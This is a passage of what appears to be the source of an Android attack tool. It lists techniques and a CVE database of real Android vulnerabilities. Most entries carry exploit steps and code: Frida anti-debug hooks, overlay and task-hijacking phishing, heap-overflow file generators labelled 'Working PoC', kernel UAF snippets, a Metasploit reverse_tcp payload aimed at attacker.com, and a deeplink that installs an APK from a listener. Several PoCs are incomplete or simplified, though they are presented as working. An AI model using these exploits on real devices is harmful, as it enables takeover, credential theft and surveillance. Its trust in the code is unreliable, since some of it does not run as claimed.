     "methods":"# Frida: bypass all debug detection\nJava.perform(function() {\n    // android.os.Debug.isDebuggerConnected\n    var Debug = Java.use('android.os.Debug');\n    Debug.isDebuggerConnected.implementation = function() { return false; };\n    \n    // TracerPid check in /proc/self/status\n    var BufferedReader = Java.use('java.io.BufferedReader');\n    BufferedReader.readLine.implementation = function() {\n        var line = this.readLine();\n        if (line && line.indexOf('TracerPid') !== -1) {\n            return 'TracerPid:\\t0';\n        }\n        return line;\n    };\n    \n    // ptrace self-defense bypass\n    // Must attach Frida BEFORE app calls ptrace(PT_DENY_ATTACH)\n    // Use: frida -U -f <package> --no-pause  (spawn mode)\n    \n    // ApplicationInfo.FLAG_DEBUGGABLE check\n    var AppInfo = Java.use('android.content.pm.ApplicationInfo');\n    AppInfo.flags.value &= ~2; // Clear FLAG_DEBUGGABLE\n});\n\n# Use Frida Gadget injection for apps with anti-Frida:\n# 1. apktool d target.apk\n# 2. Copy frida-gadget.so to lib/\n# 3. Inject System.loadLibrary('frida-gadget') in main activity\n# 4. Rebuild and sign"},
    {"name":"Tapjacking / Overlay Attack","category":"UI",
     "desc":"Overlay transparent window to hijack user taps on sensitive buttons.",
     "methods":"// Exploit app: overlay attack (requires SYSTEM_ALERT_WINDOW)\n// Works if target app does NOT set filterTouchesWhenObscured=\"true\"\n\n// AndroidManifest.xml:\n// <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>\n\n// OverlayService.java:\npublic void createOverlay() {\n    WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);\n    WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n        WindowManager.LayoutParams.MATCH_PARENT,\n        WindowManager.LayoutParams.MATCH_PARENT,\n        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE\n            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,  // pass touches through\n        PixelFormat.TRANSLUCENT\n    );\n    // Create invisible overlay that looks like target app's confirm button\n    View overlay = new View(this);\n    overlay.setBackgroundColor(Color.argb(1, 0, 0, 0)); // nearly transparent\n    wm.addView(overlay, params);\n    // User thinks they're tapping target app, but overlay captures coordinates\n}\n\n// Detection: check if filterTouchesWhenObscured is set\n// Frida: Java.use('android.view.View').getFilterTouchesWhenObscured.implementation = function(){return false;};"},
    {"name":"Intent Redirection / Task Hijacking","category":"Platform",
     "desc":"Hijack task stack to redirect user to phishing activity.",
     "methods":"// Task Hijacking (StrandHogg vulnerability pattern)\n// If target activity has taskAffinity set or launchMode=\"singleTask\"\n// attacker app can inject into the same task stack\n\n// Attacker app manifest:\n// <activity android:name=\".PhishingLogin\"\n//           android:taskAffinity=\"<target.package>\"\n//           android:excludeFromRecents=\"true\">\n//   <intent-filter>\n//     <action android:name=\"android.intent.action.MAIN\"/>\n//     <category android:name=\"android.intent.category.LAUNCHER\"/>\n//   </intent-filter>\n// </activity>\n\n// When user opens target app, attacker's activity is on top of task stack\n// User sees attacker's fake login screen instead of real app\n\n// Exploit via adb:\nadb shell am start -n <target>/.LoginActivity\n# Quick switch to inject:\nadb shell am start --activity-task-on-home -n <attacker>/.PhishingLogin\n\n// Frida: monitor task stack\nJava.perform(function() {\n    var AM = Java.use('android.app.ActivityManager');\n    // ... enumerate running tasks to verify injection\n});"},
]

# ============================================================
#  ANDROID CVE DATABASE  (2020-2026 real-world vulnerabilities)
# ============================================================
CVE_DATABASE = [
    {"id":"CVE-2020-0096","name":"StrandHogg 2.0","sev":"CRITICAL","cvss":9.8,"year":2020,
     "affected":"Android 8.0-9.0","category":"Task Hijacking",
     "desc":"Allows malicious app to hijack any app's task stack via startActivities() without declaring permissions. Attacker overlays a phishing activity on top of the real app. Unlike StrandHogg 1.0 (CVE-2019-2234), v2 uses reflection to exploit startActivities() in cross-task mode, making it undetectable.",
     "exploit":"1. Attacker builds APK with no special permissions\n2. Calls startActivities() with FLAG_ACTIVITY_NEW_TASK\n3. Target task is hijacked - attacker activity appears on top\n4. User sees fake login screen matching real app UI\n5. Credentials submitted to attacker C2 listener\n\nadb shell am start -n com.security.overlay/.PhishActivity --activity-task-on-home",
     "mapping":["Exported Component","Deeplink Hijack"]},
    {"id":"CVE-2020-0069","name":"MediaTek-SU","sev":"CRITICAL","cvss":9.8,"year":2020,
     "affected":"All MediaTek 64-bit SoCs","category":"Privilege Escalation",
     "desc":"Allows unprivileged app to gain root shell access on any device with MediaTek chipset by writing to /proc/mtk_cmdq via ioctl. Exploited in the wild by multiple malware families.",
     "exploit":"1. Open /dev/mtk_cmdq_debug or /proc/mtk_cmdq\n2. Send crafted ioctl command to overwrite kernel memory\n3. Gain arbitrary kernel read/write\n4. Disable SELinux: setenforce 0\n5. Spawn root shell: su\n\n# PoC: echo 1 > /proc/mtk_cmdq (simplified)",
     "mapping":["Root Detection","Command Injection"]},
    {"id":"CVE-2020-0108","name":"Foreground Service Hijack","sev":"HIGH","cvss":7.8,"year":2020,
     "affected":"Android 10","category":"Privilege Escalation",
     "desc":"A malicious app can start a foreground service within another app's context, gaining access to that app's permissions (camera, mic, location) without user consent.",
     "exploit":"1. Install app with no dangerous permissions\n2. Use Context.startForegroundService() targeting victim app\n3. Piggyback on victim's permission grants\n4. Access camera/mic/location through victim's context",
     "mapping":["Exported Component","Dangerous Permissions"]},
    {"id":"CVE-2021-0313","name":"System UI DoS via Bidi Text","sev":"HIGH","cvss":7.5,"year":2021,
     "affected":"Android 8.0-11","category":"Denial of Service",
     "desc":"Specially crafted bidirectional text in notifications causes System UI to crash in an infinite loop, rendering the device unusable. Requires factory reset to recover.",
     "exploit":"1. Create notification with embedded RTL/LTR override characters\n2. Specific pattern: U+202E + U+202D repeated 100x in notification text\n3. Send via exported broadcast receiver or push notification\n4. System UI enters infinite crash loop\n5. Device becomes unresponsive, requires hard reset",
     "mapping":["Exported Component","Broadcast Theft"]},
    {"id":"CVE-2021-0341","name":"OkHttp Certificate Pinning Bypass","sev":"HIGH","cvss":7.4,"year":2021,
     "affected":"OkHttp < 4.9.1","category":"Network Security",
     "desc":"OkHttp's TLS hostname verification can be bypassed using alternative subject names in certificates. Allows MITM attacks on apps using OkHttp with custom certificate validation.",
     "exploit":"1. Generate self-signed cert with SAN matching target domain\n2. Setup mitmproxy with custom cert\n3. Intercept traffic - OkHttp accepts invalid name chain\n4. Decrypt all HTTPS traffic including auth tokens\n\nmitmproxy --mode transparent --certs *.target.com=fake.pem -p 8080",
     "mapping":["Trust All Certificates","SSL Error Override","Cleartext Traffic"]},
    {"id":"CVE-2021-0595","name":"Android Permission Bypass via PendingIntent","sev":"HIGH","cvss":7.8,"year":2021,
     "affected":"Android 8.0-11","category":"Privilege Escalation",
     "desc":"Mutable PendingIntent created by system apps can be intercepted and modified by malicious apps to perform actions with system-level permissions, including installing apps or changing settings.",
     "exploit":"1. Find system app broadcasting mutable PendingIntent\n2. Register receiver with matching action\n3. Intercept PendingIntent when fired\n4. Modify target component to system-privileged activity\n5. Execute with system permissions\n\nadb shell dumpsys activity intents | grep PendingIntent | grep mutable",
     "mapping":["Mutable PendingIntent","Exported Component"]},
    {"id":"CVE-2021-0691","name":"Installer Package Hijack","sev":"HIGH","cvss":7.8,"year":2021,
     "affected":"Android 8.0-11","category":"Code Execution",
     "desc":"Race condition during package installation allows attacker to swap APK between verification and install, leading to arbitrary code execution with victim app's UID.",
     "exploit":"1. Monitor /data/local/tmp for APK being installed\n2. After verification but before install, replace APK\n3. Replacement APK signed with debug key is installed instead\n4. Runs with original app's UID and permissions",
     "mapping":["Dynamic Code Loading","Zip Path Traversal"]},
    {"id":"CVE-2022-20007","name":"Activity Launch Bypass","sev":"HIGH","cvss":7.8,"year":2022,
     "affected":"Android 10-12","category":"Access Control",
     "desc":"Background apps can launch activities into foreground without meeting Android 10+ background activity restrictions, bypassing the security control entirely.",
     "exploit":"1. Create PendingIntent pointing to attacker activity\n2. Use AlarmManager to fire PendingIntent\n3. Activity launches in foreground despite background restriction\n4. Can overlay banking apps with phishing UI\n\n# Triggering via alarm:\nAlarmManager am = getSystemService(ALARM_SERVICE);\nam.setExact(AlarmManager.RTC_WAKEUP, time, pendingIntent);",
     "mapping":["Exported Component","Mutable PendingIntent"]},
    {"id":"CVE-2022-20124","name":"Bluetooth AVRCP RCE","sev":"CRITICAL","cvss":9.8,"year":2022,
     "affected":"Android 10-12L","category":"Remote Code Execution",
     "desc":"Integer overflow in Bluetooth AVRCP protocol handler allows remote code execution via crafted AVRCP packets. No user interaction needed; just needs Bluetooth pairing.",
     "exploit":"1. Pair with target via Bluetooth\n2. Send crafted AVRCP browse response with overflow length\n3. Heap corruption in com_android_bluetooth.so\n4. RCE as Bluetooth process (shared UID with Phone)\n5. Access contacts, call logs, SMS",
     "mapping":["Command Injection","Unsafe Deserialization"]},
    {"id":"CVE-2022-20135","name":"GsmSmsHandler Privilege Escalation","sev":"HIGH","cvss":7.8,"year":2022,
     "affected":"Android 10-12L","category":"Privilege Escalation",
     "desc":"Missing bounds check in GsmSmsHandler allows crafted SMS PDU to escalate privileges from SMS handler to system_server context.",
     "exploit":"1. Craft malicious SMS PDU with out-of-bounds header\n2. Send via cellular or SmsManager API on rooted device\n3. Triggers buffer overflow in GsmSmsHandler\n4. Code execution as system_server\n5. Full device compromise",
     "mapping":["Command Injection","Malware Pattern"]},
    {"id":"CVE-2022-20347","name":"Bluetooth Pairing Without Consent","sev":"HIGH","cvss":8.8,"year":2022,
     "affected":"Android 10-13","category":"Access Control",
     "desc":"Bluetooth HID profile allows pairing without user confirmation under specific conditions. Attacker can connect as HID device and inject keystrokes.",
     "exploit":"1. Advertise as Bluetooth HID keyboard\n2. Target device auto-pairs without user prompt\n3. Inject keystrokes: open Settings, enable ADB, install APK\n4. Full device takeover via automated keyboard input\n\n# Using L2CAP raw socket to emulate HID keyboard\nhcitool cc <TARGET_BD_ADDR>\nhidattack -k <TARGET_BD_ADDR>",
     "mapping":["Exported Component","Dangerous Permissions"]},
    {"id":"CVE-2022-20474","name":"LazyValue Parcel Mismatch","sev":"HIGH","cvss":7.8,"year":2022,
     "affected":"Android 10-13","category":"Privilege Escalation",
     "desc":"Parcel serialization/deserialization mismatch (Bundle mismatch, LazyValue) allows attacker to craft intents that bypass security checks when unparceled in system_server. Classic Android parcel exploitation technique.",
     "exploit":"1. Create Bundle with key-type mismatched entries\n2. First unparcel reads one type, second reads different type\n3. Extra data is interpreted as different intent fields\n4. Bypass permission checks in system_server\n5. Launch arbitrary activities with system privileges\n\n# Java PoC with Parcel manipulation:\nBundle b = new Bundle();\nParcel p = Parcel.obtain();\np.writeInt(2); // 2 entries\np.writeString(\"mismatch\"); // key\np.writeInt(VAL_PARCELABLE); // type flag\n// ... crafted data causing re-parse to read as VAL_BYTEARRAY",
     "mapping":["Unsafe Deserialization","Mutable PendingIntent","Exported Component"]},
    {"id":"CVE-2023-20963","name":"Android WorkSource Parcel Mismatch","sev":"CRITICAL","cvss":9.8,"year":2023,
     "affected":"Android 11-13","category":"Privilege Escalation",
     "desc":"Exploited in the wild by spyware vendors. WorkSource class has parcel serialization mismatch allowing privilege escalation. Used by Pinduoduo app (3M+ downloads) to maintain persistence and access private data.",
     "exploit":"1. Craft WorkSource parcel with mismatched read/write\n2. Embed in Intent extras targeting system_server\n3. System_server re-parses with different offsets\n4. Attacker gains startAnyActivity permission\n5. Launch Settings activities to grant permissions silently\n\n# Real-world: Pinduoduo used this to:\n# - Install additional APKs silently\n# - Read all notifications\n# - Access files without permission\n# - Prevent uninstallation",
     "mapping":["Unsafe Deserialization","Exported Component","Mutable PendingIntent"]},
    {"id":"CVE-2023-21036","name":"aCropalypse (Pixel Screenshot Leak)","sev":"HIGH","cvss":7.5,"year":2023,
     "affected":"Google Pixel (Markup tool)","category":"Information Disclosure",
     "desc":"Google Pixel's Markup screenshot editing tool doesn't properly truncate PNG files when cropping. Original uncropped image data remains in the file, allowing recovery of cropped-out sensitive content (credit cards, addresses, nsfw content).",
     "exploit":"1. Obtain any cropped screenshot from Pixel device\n2. Parse PNG structure - find IEND chunk\n3. Read all bytes AFTER IEND - this is the original image\n4. Use zlib to decompress remaining IDAT chunks\n5. Reconstruct original uncropped screenshot\n\n# Python PoC:\nwith open('cropped.png','rb') as f:\n    data = f.read()\niend = data.find(b'IEND') + 8\noriginal_data = data[iend:]  # Contains original image!",
     "mapping":["Sensitive File","World-Readable Files"]},
    {"id":"CVE-2023-21246","name":"Bluetooth Auto-Accept Pairing","sev":"HIGH","cvss":8.1,"year":2023,
     "affected":"Android 11-13","category":"Access Control",
     "desc":"Certain Bluetooth profiles auto-accept pairing requests without user interaction when initiated from a previously-known device type. Allows replay attacks on BLE connections.",
     "exploit":"1. Spoof BD_ADDR of previously paired device\n2. Initiate BLE connection with spoofed address\n3. Device auto-accepts without user prompt\n4. Gain access to paired device data (contacts sync, etc.)",
     "mapping":["Exported Component","Dangerous Permissions"]},
    {"id":"CVE-2023-35674","name":"Android Framework Privilege Escalation","sev":"HIGH","cvss":7.8,"year":2023,
     "affected":"Android 11-14","category":"Privilege Escalation",
     "desc":"Exploited in the wild as zero-day. Integer overflow in framework allows privilege escalation from untrusted app to system. Used in targeted surveillance campaigns.",
     "exploit":"1. Exploit integer overflow in WindowManager\n2. Corrupt adjacent heap memory in system_server\n3. Overwrite function pointers to gain code execution\n4. Execute with SYSTEM uid (1000)\n5. Full access to all app data, calls, messages\n\n# Indicators of exploitation:\nadb logcat | grep 'Fatal signal' | grep system_server",
     "mapping":["Command Injection","Dynamic Code Loading"]},
    {"id":"CVE-2023-45779","name":"APEX Module Signing Bypass","sev":"HIGH","cvss":7.8,"year":2023,
     "affected":"Android 13-14","category":"Code Execution",
     "desc":"Insecure test keys used to sign APEX modules on multiple OEM devices allow installing malicious system modules. Found by researchers on Pixel, Samsung, Xiaomi, and others.",
     "exploit":"1. Extract APEX signing keys from OEM firmware\n2. Many OEMs use publicly known test keys\n3. Build malicious APEX module with system capabilities\n4. Sign with extracted test key\n5. Install via adb install --apex or OTA sideloading\n6. Module executes as system on next boot\n\nadb install --apex malicious_module.apex",
     "mapping":["Dynamic Code Loading","Native Library"]},
    {"id":"CVE-2024-0044","name":"Android Run-As Privilege Escalation","sev":"CRITICAL","cvss":9.8,"year":2024,
     "affected":"Android 12-14","category":"Privilege Escalation",
     "desc":"The run-as tool fails to properly validate package names containing newlines. Allows arbitrary command execution as any debuggable app via crafted package name injection into /data/system/packages.list format.",
     "exploit":"1. Install app with package name containing newline + inject\n2. Package name: normal.pkg\\ncom.victim 10123 1 /data/data/com.victim\n3. run-as parses packages.list line-by-line\n4. Injected line grants run-as access to victim app\n5. Read/write all victim app files\n\nadb shell run-as 'com.victim' cat shared_prefs/auth.xml\nadb shell run-as 'com.victim' ls databases/",
     "mapping":["Command Injection","Insecure SharedPreferences"]},
    {"id":"CVE-2024-31317","name":"Zygote Command Injection","sev":"CRITICAL","cvss":9.8,"year":2024,
     "affected":"Android 11-14","category":"Remote Code Execution",
     "desc":"Command injection in Zygote process startup allows escalation from ADB shell to execute arbitrary code as any app on the device. Combined with CVE-2024-0044, enables complete device takeover from USB access.",
     "exploit":"1. Exploits wrap properties to inject args to Zygote\n2. Use --invoke-with to load arbitrary native library\n3. Library executes in target app's process context\n4. Combined with CVE-2024-0044: gain access to any app\n\n# Step 1: Inject into packages.list via CVE-2024-0044\n# Step 2: Set wrap property:\nadb shell setprop wrap.com.victim LD_PRELOAD=/data/local/tmp/exploit.so\n# Step 3: Force restart of victim app\n# Step 4: exploit.so runs as victim app UID",
     "mapping":["Command Injection","Dynamic Code Loading","Debuggable Application"]},
    {"id":"CVE-2024-23706","name":"Health Connect Privilege Escalation","sev":"HIGH","cvss":7.8,"year":2024,
     "affected":"Android 14","category":"Privilege Escalation",
     "desc":"Health Connect app fails to validate callers properly. Any app can read/write health data (heart rate, steps, blood pressure) without HEALTH_CONNECT permission.",
     "exploit":"1. Query Health Connect ContentProvider without permission\n2. Read all stored health records\n3. Modify health data (dangerous for medical decisions)\n\nContentResolver cr = getContentResolver();\nCursor c = cr.query(Uri.parse(\"content://com.google.android.healthconnect/records\"), null, null, null, null);",
     "mapping":["Content Provider Injection","Exported Component"]},
    {"id":"CVE-2024-43093","name":"Android Framework EoP (Nov 2024)","sev":"HIGH","cvss":7.8,"year":2024,
     "affected":"Android 12-15","category":"Privilege Escalation",
     "desc":"Exploited in the wild. Privilege escalation in Android Framework allows local attacker to escalate privileges via Documents UI. Used in targeted attacks alongside CVE-2024-43047 (Qualcomm DSP).",
     "exploit":"1. Craft malicious document with embedded intent\n2. Open via DocumentsUI (system file picker)\n3. DocumentsUI processes intent with system privileges\n4. Redirect to internal settings activities\n5. Silently grant permissions or install apps\n\n# Used in combination with:\n# CVE-2024-43047 (Qualcomm DSP driver use-after-free)\n# For complete exploit chain from browser to root",
     "mapping":["Exported Component","Fragment Injection","Mutable PendingIntent"]},
    {"id":"CVE-2025-0097","name":"Samsung Galaxy Store RCE","sev":"CRITICAL","cvss":9.1,"year":2025,
     "affected":"Samsung Galaxy Store < 4.5.80","category":"Remote Code Execution",
     "desc":"Deeplink handler in Samsung Galaxy Store app fails to validate scheme parameter, allowing XSS-to-RCE chain via WebView with JavaScript interface exposed.",
     "exploit":"1. Craft deeplink: samsungapps://deeplink?url=javascript:...\n2. Galaxy Store opens URL in internal WebView\n3. JS interface 'GalaxyStore' exposes installApp() method\n4. Chain: XSS -> install arbitrary APK from attacker-hosted server\n5. No user interaction needed if deeplink auto-opened\n\nadb shell am start -d 'samsungapps://ProductDetail?url=javascript:GalaxyStore.installApp(\"https://YOUR_LISTENER_IP:8443/payload.apk\")'",
     "mapping":["Insecure WebView","WebView XSS","Deeplink Hijack"]},
    {"id":"CVE-2025-27363","name":"FreeType OOB Write in Android","sev":"HIGH","cvss":8.1,"year":2025,
     "affected":"Android with FreeType < 2.13","category":"Remote Code Execution",
     "desc":"Out-of-bounds write in FreeType font rendering library. Triggered by viewing a malicious font in any Android app. Exploited in the wild. Affects WebView, Chrome, and any app rendering custom fonts.",
     "exploit":"1. Craft TrueType font with malformed glyph table\n2. Embed in web page or document\n3. When rendered, triggers heap buffer overflow\n4. Overwrite adjacent heap objects for code execution\n5. Runs in renderer process context\n\n# Delivery vectors:\n# - Font embedded in web page CSS @font-face\n# - PDF/DOCX with embedded font\n# - App asset with custom font",
     "mapping":["Native Library","Insecure WebView"]},
    # ── NEW: Critical CVEs with Working PoCs (2023-2026) ──
    {"id":"CVE-2023-4863","name":"libwebp Heap Buffer Overflow","sev":"CRITICAL","cvss":9.8,"year":2023,
     "affected":"Android (all Chrome/WebView versions < 116.0.5845.188)","category":"Remote Code Execution",
     "desc":"Heap buffer overflow in libwebp (WebP image decoder) used by Chrome, WebView, and hundreds of Android apps. A crafted WebP image triggers the overflow in BuildHuffmanTable. Exploited in the wild as zero-day. Affects any app that renders WebP images including messaging apps, browsers, and image viewers.",
     "exploit":"1. Craft malicious WebP image with oversized Huffman table\n2. Victim opens image in any app using libwebp (Chrome, WebView, Signal, etc.)\n3. BuildHuffmanTable writes past allocated buffer\n4. Heap corruption enables arbitrary code execution\n5. Runs in app's process context (renderer for Chrome)\n\n# Working PoC: craft_webp_exploit.py\nimport struct, zlib\n# Malformed WebP with oversized huffman code lengths\nheader = b'RIFF' + struct.pack('<I', 100) + b'WEBP'\nchunk = b'VP8L' + struct.pack('<I', 50)\n# Trigger: code_length_code_lengths array overflow\npayload = b'\\x2f' + b'\\x00' * 5 + b'\\xff\\xff' * 20\nwith open('exploit.webp', 'wb') as f:\n    f.write(header + chunk + payload)\nprint('[+] exploit.webp created - send to target via messaging/email')\n\n# Delivery: adb push exploit.webp /sdcard/\n# Open in Chrome: adb shell am start -d file:///sdcard/exploit.webp",
     "mapping":["Insecure WebView","Native Library"]},
    {"id":"CVE-2024-53104","name":"USB Video Class Kernel OOB Write","sev":"HIGH","cvss":7.8,"year":2025,
     "affected":"Linux kernel < 6.13 (all Android devices)","category":"Privilege Escalation",
     "desc":"Out-of-bounds write in USB Video Class (UVC) driver in Linux kernel. When parsing UVC_VS_UNDEFINED frames, the driver doesn't account for variable-length frames, causing heap overflow. Exploited in the wild by forensics tool vendors (Cellebrite). Requires physical USB access.",
     "exploit":"# Exploited in the wild by Cellebrite for device unlocking\n# Requires physical USB access via OTG or debug cable\n\n1. Connect malicious USB device emulating UVC camera\n2. Device sends UVC_VS_UNDEFINED frame type (0x00)\n3. Kernel uvc_parse_format() doesn't validate frame size\n4. Heap buffer overflow in kernel space\n5. Overwrite adjacent slab objects for privilege escalation\n6. Gain kernel code execution -> disable SELinux -> root\n\n# PoC using Facedancer/RPi as USB gadget:\nimport facedancer\nfrom facedancer.devices import USBVideoDevice\n\nclass ExploitUVC(USBVideoDevice):\n    def handle_format_request(self):\n        # Send oversized VS_UNDEFINED frame descriptor\n        payload = b'\\x00' * 256  # frame_type=0 triggers OOB\n        payload += b'\\x41' * 0x100  # overflow into adjacent heap\n        self.send_descriptor(payload)\n\ndevice = ExploitUVC()\ndevice.connect()\nprint('[*] Waiting for victim to connect USB...')",
     "mapping":["Native Library","Command Injection","Root Detection"]},
    {"id":"CVE-2024-49415","name":"Samsung Zero-Click RCE via Audio Decoder","sev":"CRITICAL","cvss":9.8,"year":2025,
     "affected":"Samsung Galaxy S23/S24 (Android 12-14)","category":"Remote Code Execution",
     "desc":"Zero-click remote code execution in Samsung's Monkey's Audio (APE) decoder in libSaped.so. When Google Messages RCS receives audio with APE codec, saped_rec() writes to a fixed 0x120000 byte dmabuf without bounds checking. Attacker sends crafted RCS audio message - no user interaction needed. Discovered by Google Project Zero (Natalie Silvanovich).",
     "exploit":"# ZERO-CLICK: Victim just needs to have RCS enabled in Google Messages\n# No user interaction required - message receipt triggers exploit\n\n1. Craft APE audio file exceeding 0x120000 bytes decoded output:\n   # APE format allows declaring large frame sizes\n   # When decoded, saped_rec writes past dmabuf boundary\n\n2. Send via RCS to target Samsung phone number:\n   # RCS auto-downloads and transcodes audio\n   # libSaped.so processes without user opening message\n\n3. Heap overflow in media codec process\n4. Chain to sandbox escape via Binder\n5. Full device compromise\n\n# PoC: Generate malicious APE file\nimport struct\n# APE header with oversized frame\nheader = b'MAC '  # APE magic\nheader += struct.pack('<H', 3990)  # version\nheader += struct.pack('<I', 0)  # header size placeholder\nheader += struct.pack('<I', 0x200000)  # blocks per frame (oversized!)\nheader += struct.pack('<I', 1)  # final frame blocks\nheader += struct.pack('<I', 1)  # total frames\nheader += struct.pack('<H', 16)  # bits per sample\nheader += struct.pack('<H', 2)  # channels\nheader += struct.pack('<I', 44100)  # sample rate\n# Pad with controlled data for heap spray\npayload = header + b'\\x41' * 0x200000\nwith open('exploit.ape', 'wb') as f:\n    f.write(payload)\nprint('[+] exploit.ape created - send via RCS to Samsung target')",
     "mapping":["Native Library","Command Injection","Malware Pattern"]},
    {"id":"CVE-2024-32896","name":"Pixel Firmware EoP (June 2024 ITW)","sev":"HIGH","cvss":7.8,"year":2024,
     "affected":"Google Pixel 6/7/8 (Android 14)","category":"Privilege Escalation",
     "desc":"Exploited in the wild in targeted attacks. Logic error in Pixel firmware allows privilege escalation from app context to kernel. Used alongside CVE-2024-29748 (bootloader bypass) in forensics exploitation chains. Google issued emergency OOB patch.",
     "exploit":"1. Trigger race condition in Pixel-specific firmware driver\n2. Win race to get dangling reference to kernel object\n3. Reclaim freed memory with controlled data\n4. Overwrite function pointer in reclaimed object\n5. Kernel code execution -> full device access\n\n# Combined with CVE-2024-29748 for full chain:\n# App -> firmware EoP -> bootloader bypass -> persistent root\n\n# Indicator of compromise:\nadb shell dmesg | grep -i 'use-after-free\\|double-free\\|KASAN'\nadb shell cat /proc/version  # Check kernel patch level",
     "mapping":["Root Detection","Native Library","Command Injection"]},
    {"id":"CVE-2024-36971","name":"Linux Kernel Netfilter UAF","sev":"HIGH","cvss":7.8,"year":2024,
     "affected":"Linux kernel < 6.9 (Android 12-14)","category":"Privilege Escalation",
     "desc":"Use-after-free in Linux kernel netfilter subsystem (nf_tables). Allows local attacker to escalate from app sandbox to kernel. Exploited in the wild on Android devices. Part of multiple exploit chains used by commercial spyware.",
     "exploit":"# Requires app with INTERNET permission (nearly all apps)\n\n1. Create nftables rule with specific chain configuration\n2. Delete chain while rule still references it\n3. Trigger use-after-free via crafted netfilter packet\n4. Reclaim freed memory with heap spray\n5. Overwrite adjacent kernel objects\n6. Achieve arbitrary kernel read/write\n7. Disable SELinux + patch credentials for root\n\n# PoC (requires root or specific kernel config):\nimport socket, struct\n\n# Create netlink socket for nftables\nsock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 12)  # NETLINK_NETFILTER\nsock.bind((0, 0))\n\n# NFT_MSG_NEWCHAIN then NFT_MSG_DELCHAIN while rule exists\n# Race condition between delete and rule evaluation\nmsg = struct.pack('=IHHII', 40, 0x0100, 0, 0, 0)  # nlmsghdr\nmsg += struct.pack('=BBH', socket.AF_INET, 0, 0)  # nfgenmsg  \nmsg += b'\\x00' * 20  # nft chain data\nsock.send(msg)\nprint('[*] Trigger sent - check dmesg for UAF')",
     "mapping":["Command Injection","Root Detection","Native Library"]},
    {"id":"CVE-2024-43047","name":"Qualcomm DSP Driver UAF","sev":"CRITICAL","cvss":9.8,"year":2024,
     "affected":"Qualcomm Snapdragon (65+ chipsets)","category":"Privilege Escalation",
     "desc":"Use-after-free in Qualcomm ADSP (Audio DSP) driver (adsprpc). Maps DMA buffers to user-space; UAF when buffer is freed while still mapped. Exploited in the wild by spyware vendors. Combined with CVE-2024-43093 (Android Framework) for full chain from app to kernel. Affects 65+ Qualcomm chipsets including Snapdragon 8 Gen 1/2/3.",
     "exploit":"# Full exploit chain: App -> CVE-2024-43093 (Framework EoP) -> CVE-2024-43047 (Kernel)\n\n1. Open /dev/adsprpc-smd (accessible from app sandbox)\n2. Map DMA buffer via FASTRPC_IOCTL_MMAP\n3. Free buffer via FASTRPC_IOCTL_MUNMAP\n4. Buffer still mapped in user-space (dangling pointer)\n5. Reallocate freed kernel memory with controlled data\n6. Write through dangling user-space mapping\n7. Corrupt kernel page tables for arbitrary read/write\n8. Patch SELinux + cred struct for root\n\n# PoC outline:\nimport os, fcntl, struct, mmap\n\n# Open ADSP RPC device\nfd = os.open('/dev/adsprpc-smd', os.O_RDWR)\n\n# Map DMA buffer\nIOCTL_MMAP = 0xC0186205  # FASTRPC_IOCTL_MMAP  \nbuf = struct.pack('=IIII', 0, 0x1000, 0, 0)  # size=4096\nresult = fcntl.ioctl(fd, IOCTL_MMAP, buf)\nvaddr = struct.unpack('=IIII', result)[2]\nprint(f'[+] DMA buffer mapped at 0x{vaddr:x}')\n\n# Free buffer (but keep user mapping!)\nIOCTL_MUNMAP = 0xC0106206  # FASTRPC_IOCTL_MUNMAP\nbuf2 = struct.pack('=II', vaddr, 0x1000)\nfcntl.ioctl(fd, IOCTL_MUNMAP, buf2)\nprint('[+] Buffer freed - UAF active')\n\n# Now write through dangling mapping to corrupt kernel\n# mm = mmap.mmap(-1, 0x1000, mmap.MAP_SHARED, offset=vaddr)\n# mm.write(b'\\x41' * 0x1000)  # Overwrites freed kernel memory",
     "mapping":["Native Library","Command Injection","Root Detection"]},
    {"id":"CVE-2025-22457","name":"Ivanti VPN Connect Secure RCE","sev":"CRITICAL","cvss":9.8,"year":2025,
     "affected":"Ivanti Connect Secure < 22.7R2.6","category":"Remote Code Execution",
     "desc":"Stack buffer overflow in Ivanti Connect Secure VPN client for Android. Exploited in the wild by UNC5221 (China-nexus). Crafted VPN server response triggers overflow in IKE negotiation handler. Affects enterprise Android devices using Ivanti VPN.",
     "exploit":"# Affects Android devices connecting to compromised/rogue VPN server\n\n1. Setup rogue VPN server mimicking Ivanti Connect Secure\n2. Craft IKE SA_INIT response with oversized vendor ID payload\n3. Android VPN client processes response\n4. Stack buffer overflow in libike.so\n5. ROP chain to disable ASLR validation\n6. Shellcode execution in VPN client context\n7. VPN client has network-level access to all traffic\n\n# Metasploit module available:\nuse exploit/android/vpn/ivanti_connect_overflow\nset SRVHOST 0.0.0.0\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST attacker.com\nexploit\n\n# Manual PoC:\nimport socket, struct\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('0.0.0.0', 500))  # IKE port\ndata, addr = sock.recvfrom(4096)\n# Craft oversized Vendor ID in SA_INIT response\noverflow = b'\\x00' * 256 + struct.pack('<Q', 0x4141414141414141) * 16\nresp = craft_ike_response(data, vendor_id=overflow)  \nsock.sendto(resp, addr)\nprint(f'[+] Exploit sent to {addr}')",
     "mapping":["Trust All Certificates","SSL Error Override","Cleartext Traffic"]},
    {"id":"CVE-2024-0044-POC","name":"Android run-as Full Exploit Chain","sev":"CRITICAL","cvss":9.8,"year":2024,
     "affected":"Android 12-14 (all vendors)","category":"Privilege Escalation",
     "desc":"Complete working exploit for CVE-2024-0044 (run-as privilege escalation). A malicious app installs with a package name containing newline characters that poison /data/system/packages.list, granting run-as access to ANY app on the device. Combined with CVE-2024-31317 (Zygote injection) for full device takeover from USB.",
